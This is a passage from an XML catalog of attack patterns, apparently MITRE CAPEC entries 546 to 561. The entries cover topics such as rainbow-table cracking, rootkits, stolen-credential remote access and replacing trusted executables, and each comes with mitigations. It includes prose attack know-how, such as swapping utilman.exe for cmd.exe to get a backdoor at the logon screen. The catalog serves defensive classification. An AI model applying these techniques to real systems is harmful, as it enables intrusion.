            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1081</Entry_ID>
               <Entry_Name>Credentials in files</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Probe Application Queries</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="546" Name="Probe Application Memory" Abstraction="Detailed" Status="Draft">
         <Description>An adversary obtains unauthorized information due to insecure or incomplete data deletion in a multi-tenant environment. If a cloud provider fails to completely delete storage and data from former cloud tenants' systems/resources, once these resources are allocated to new, potentially malicious tenants, the latter can probe the provided resources for sensitive information still there.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="545"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The cloud provider must not assuredly delete part or all of the sensitive data for which they are responsible.The adversary must have the ability to interact with the system.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary requires the ability to traverse directory structure.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
               <Note>A successful attack that probes application memory will compromise the confidentiality of that data.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Cloud providers should completely delete data to render it irrecoverable and inaccessible from any layer and component of infrastructure resources.</Mitigation>
            <Mitigation>Deletion of data should be completed promptly when requested.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-461"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="547" Name="Physical Destruction of Device or Component" Abstraction="Standard" Status="Draft">
         <Description>An adversary conducts a physical attack a device or component, destroying it such that it no longer functions as intended.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="607">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="548" Name="Contaminate Resource" Abstraction="Meta" Status="Draft">
         <Description>An adversary contaminates organizational information systems (including devices and networks) by causing them to handle information of a classification/sensitivity for which they have not been authorized. The information is exposed to individuals who are not authorized access to such information, and the information system, device, or network is unavailable while the spill is investigated and mitigated.</Description>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="549" Name="Local Execution of Code" Abstraction="Meta" Status="Stable">
         <Description>An adversary installs and executes malicious code on the target system in an effort to achieve a negative technical impact. Examples include rootkits, ransomware, spyware, adware, and others.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Prerequisites>
            <Prerequisite>Knowledge of the target system's vulnerabilities that can be capitalized on with malicious code.The adversary must be able to place the malicious code on the target system.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>The means by which the adversary intends to place the malicious code on the system dictates the tools required. For example, suppose the adversary wishes to leverage social engineering and convince a legitimate user to open a malicious file attached to a seemingly legitimate email. In this case, the adversary might require a tool capable of wrapping malicious code into an innocuous filetype (e.g., PDF, .doc, etc.)</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>Depending on the type of code executed by the adversary, the consequences of this attack pattern can vary widely.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Employ robust cybersecurity training for all employees.</Mitigation>
            <Mitigation>Implement system antivirus software that scans all attachments before opening them.</Mitigation>
            <Mitigation>Regularly patch all software.</Mitigation>
            <Mitigation>Execute all suspicious files in a sandbox environment.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="829"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Methods_of_Attack, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="55" Name="Rainbow Table Password Cracking" Abstraction="Standard" Status="Draft">
         <Description>An attacker gets access to the database table where hashes of passwords are stored. He then uses a rainbow table of pre-computed hash chains to attempt to look up the original password. Once the original password corresponding to the hash is obtained, the attacker uses the original password to gain access to the system. A password rainbow table stores hash chains for various passwords. A password chain is computed, starting from the original password, P, via a reduce(compression) function R and a hash function H. A recurrence relation exists where Xi+1 = R(H(Xi)), X0 = P. Then the hash chain of length n for the original password P can be formed: X1, X2, X3, ... , Xn-2, Xn-1, Xn, H(Xn). P and H(Xn) are then stored together in the rainbow table. Constructing the rainbow tables takes a very long time and is computationally expensive. A separate table needs to be constructed for the various hash algorithms (e.g. SHA1, MD5, etc.). However, once a rainbow table is computed, it can be very effective in cracking the passwords that have been hashed without the use of salt.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="49"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine application's/system's password policy] Determine the password policies of the target application/system.</Description>
               <Technique>Determine minimum and maximum allowed password lengths.</Technique>
               <Technique>Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).</Technique>
               <Technique>Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Obtain password hashes] An attacker gets access to the database table storing hashes of passwords or potentially just discovers a hash of an individual password.</Description>
               <Technique>Obtain copy of database table or flat file containing password hashes (by breaking access controls, using SQL Injection, etc.)</Technique>
               <Technique>Obtain password hashes from platform-specific storage locations (e.g. Windows registry)</Technique>
               <Technique>Sniff network packets containing password hashes.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Run rainbow table-based password cracking tool] An attacker finds or writes a password cracking tool that uses a previously computed rainbow table for the right hashing algorithm. It helps if the attacker knows what hashing algorithm was used by the password system.</Description>
               <Technique>Run rainbow table-based password cracking tool such as Ophcrack or RainbowCrack. Reduction function must depend on application's/system's password policy.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Hash of the original password is available to the attacker. For a better chance of success, an attacker should have more than one hash of the original password, and ideally the whole table.</Prerequisite>
            <Prerequisite>Salt was not used to create the hash of the original password. Otherwise the rainbow tables have to be re-computed, which is very expensive and will make the attack effectively infeasible (especially if salt was added in iterations).</Prerequisite>
            <Prerequisite>The system uses one factor password based authentication.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">A variety of password cracking tools are available that can leverage a rainbow table. The more difficult part is to obtain the password hash(es) in the first place.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Rainbow table of password hash chains with the right algorithm used. A password cracking tool that leverages this rainbow table will also be required. Hash(es) of the password is required.</Resource>
         </Resources_Required>
         <Indicators>
            <Indicator>This is a completely offline attack that an attacker can perform at their leisure after the password hashes are obtained.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use salt when computing password hashes. That is, concatenate the salt (random bits) with the original password prior to hashing it.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>BusyBox 1.1.1 does not use a salt when generating passwords, which makes it easier for local users to guess passwords from a stolen password file using techniques such as rainbow tables. See also: CVE-2006-1058</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="261"/>
            <Related_Weakness CWE_ID="521"/>
            <Related_Weakness CWE_ID="262"/>
            <Related_Weakness CWE_ID="263"/>
            <Related_Weakness CWE_ID="693"/>
            <Related_Weakness CWE_ID="719"/>
            <Related_Weakness CWE_ID="916"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="550" Name="Install New Service" Abstraction="Detailed" Status="Draft">
         <Description>When an operating system starts, it also starts programs called services or daemons. Adversaries may install a new service which will be executed at startup (on a Windows system, by modifying the registry). The service name may be disguised by using a name from a related operating system or benign software. Services are usually run with elevated privileges.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="542"/>
         </Related_Attack_Patterns>
         <Mitigations>
            <Mitigation>Limit privileges of user accounts so new service creation can only be performed by authorized administrators.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1050</Entry_ID>
               <Entry_Name>New Service</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1160</Entry_ID>
               <Entry_Name>Launch Daemon</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1152</Entry_ID>
               <Entry_Name>Launchctl</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="551" Name="Modify Existing Service" Abstraction="Detailed" Status="Draft">
         <Description>When an operating system starts, it also starts programs called services or daemons. Modifying existing services may break existing services or may enable services that are disabled/not commonly used.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="542"/>
         </Related_Attack_Patterns>
         <Mitigations>
            <Mitigation>Limit privileges of user accounts so service changes can only be performed by authorized administrators. Also monitor any service changes that may occur inadvertently.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
            <Related_Weakness CWE_ID="522"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1031</Entry_ID>
               <Entry_Name>Modify Existing Service</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="552" Name="Install Rootkit " Abstraction="Detailed" Status="Draft">
         <Description>An adversary exploits a weakness in authentication to install malware that alters the functionality and information provide by targeted operating system API calls. Often referred to as rootkits, it is often used to hide the presence of programs, files, network connections, services, drivers, and other system components.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="542"/>
         </Related_Attack_Patterns>
         <Mitigations>
            <Mitigation>Prevent adversary access to privileged accounts necessary to install rootkits.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>A rootkit may take the form of a hypervisor. A hypervisor is a software layer that sits between the operating system and the processor. It presents a virtual running environment to the operating system. An example of a common hypervisor is Xen. Because a hypervisor operates at a level below the operating system it can hide its existence from the operating system.</Example>
            <Example>Similar to a rootkit, a bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1062</Entry_ID>
               <Entry_Name>Hypervisor</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1067</Entry_ID>
               <Entry_Name>Bootkit</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1014</Entry_ID>
               <Entry_Name>Rootkit</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1215</Entry_ID>
               <Entry_Name>Kernel Modules and Extensions</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary, Examples-Instances, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses, Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="554" Name="Functionality Bypass" Abstraction="Meta" Status="Draft">
         <Description>An adversary attacks a system by bypassing some or all functionality intended to protect it. Often, a system user will think that protection is in place, but the functionality behind those protections has been disabled by the adversary.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="424"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-12-07</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="555" Name="Remote Services with Stolen Credentials" Abstraction="Detailed" Status="Stable">
         <Description>This pattern of attack involves an adversary that uses stolen credentials to leverage remote services such as RDP, telnet, SSH, and VNC to log into a system. Once access is gained, any number of malicious activities could be performed.</Description>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="560"/>
         </Related_Attack_Patterns>
         <Mitigations>
            <Mitigation>Disable RDP, telnet, SSH and enable firewall rules to block such traffic. Limit users and accounts that have remote interactive login access. Remove the Local Administrators group from the list of groups allowed to login through RDP. Limit remote user permissions. Use remote desktop gateways and multifactor authentication for remote logins.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). There are other implementations and third-party tools that provide graphical access Remote Services similar to RDS. Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.</Example>
            <Example>Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="522"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1076</Entry_ID>
               <Entry_Name>Remote Desktop Protocol</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1021</Entry_ID>
               <Entry_Name>Remote Services</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1133</Entry_ID>
               <Entry_Name>External Remote Services</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1028</Entry_ID>
               <Entry_Name>Windows Remote Management</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary, Examples-Instances, References, Related_Weaknesses, Typical_Severity</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="556" Name="Replace File Extension Handlers" Abstraction="Detailed" Status="Draft">
         <Description>When a file is opened, its file handler is checked to determine which program opens the file. File handlers are configuration properties of many operating systems. Applications can modify the file handler for a given file extension to call an arbitrary program when a file with the given extension is opened.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="542"/>
         </Related_Attack_Patterns>
         <Mitigations>
            <Mitigation>Inspect registry for changes. Limit privileges of user accounts so changes to default file handlers can only be performed by authorized administrators.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1042</Entry_ID>
               <Entry_Name>Change Default File Association</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="558" Name="Replace Trusted Executable" Abstraction="Detailed" Status="Stable">
         <Description>An adversary exploits weaknesses in privilege management or access control to replace a trusted executable with a malicious version and enable the execution of malware when that trusted executable is called.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="542"/>
         </Related_Attack_Patterns>
         <Example_Instances>
            <Example>Specific versions of Windows contain accessibility features that may be launched with a key combination before a user has logged in (for example when they are on the Windows Logon screen). On Windows XP and Windows Server 2003/R2, the program (e.g. "C:\Windows\System32\utilman.exe") may be replaced with cmd.exe (or another program that provides backdoor access). Then pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over RDP will cause the replaced file to be executed with SYSTEM privileges.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1015</Entry_ID>
               <Entry_Name>Accessibility Features</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary, References, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="559" Name="Orbital Jamming" Abstraction="Detailed" Status="Draft">
         <Description>In this attack pattern, the adversary sends disruptive signals at a target satellite using a rogue uplink station to disrupt the intended transmission. Those within the satellite's footprint are prevented from reaching the satellite's targeted or neighboring channels. The satellite's footprint size depends upon its position in the sky; higher orbital satellites cover multiple continents.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="601"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This attack requires the knowledge of the satellite's coordinates for targeting.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>A satellite uplink station.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Other</Impact>
               <Note>A successful attack will deny the availability of the satellite communications for authorized users.</Note>
            </Consequence>
         </Consequences>
         <References>
            <Reference External_Reference_ID="REF-462"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Seamus Tuohy</Submission_Name>
               <Submission_Date>2017-01-12</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="560" Name="Use of Known Domain Credentials" Abstraction="Standard" Status="Draft">
         <Description>An adversary uses stolen credentials (e.g., userid and password) to access systems managed under the same credential framework on a local network. Often, users are allowed to login to connected machines using the same password. Discovery of the password on one machine allows for lateral movement to those machines.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="21"/>
         </Related_Attack_Patterns>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="522"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1078</Entry_ID>
               <Entry_Name>Valid Accounts</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1199</Entry_ID>
               <Entry_Name>Trusted Relationship</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses, Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="561" Name="Windows Admin Shares with Stolen Credentials" Abstraction="Detailed" Status="Draft">
         <Description>Windows systems have hidden network shares that are only accessible to administrators and allow files to be written to the local computer. Example network shares include: C$, ADMIN$ and IPC$. Adversaries may use valid administrator credentials to remotely access a network share to transfer files and execute code. It is possible for adversaries to use NTLM hashes to access administrator shares on systems with certain configuration and patch levels.</Description>
         <Related_Attack_Patterns>
